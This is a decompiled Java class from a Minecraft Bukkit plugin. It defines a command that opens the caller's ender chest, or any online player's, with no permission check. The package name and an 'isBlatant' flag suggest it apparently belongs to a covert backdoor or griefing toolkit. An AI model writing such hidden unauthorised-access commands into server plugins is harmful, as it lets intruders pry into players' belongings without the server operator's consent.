/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.concurrent.ExecutionException;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class EnderchestCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                try {
                    Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> p2.openInventory(p2.getEnderChest())).get();
                }
                catch (InterruptedException | ExecutionException exception) {
                    // empty catch block
                }
            });
            p2.sendMessage(Settings.PREFIX("You are now viewing your ender chest"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)plugin, () -> p2.openInventory(target.getEnderChest())).get();
                    }
                    catch (InterruptedException | ExecutionException exception) {
                        // empty catch block
                    }
                });
                p2.sendMessage(Settings.PREFIX("You are now viewing " + Settings.RED + target.getName() + "'s" + Settings.WHITE + " Ender Chest."));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

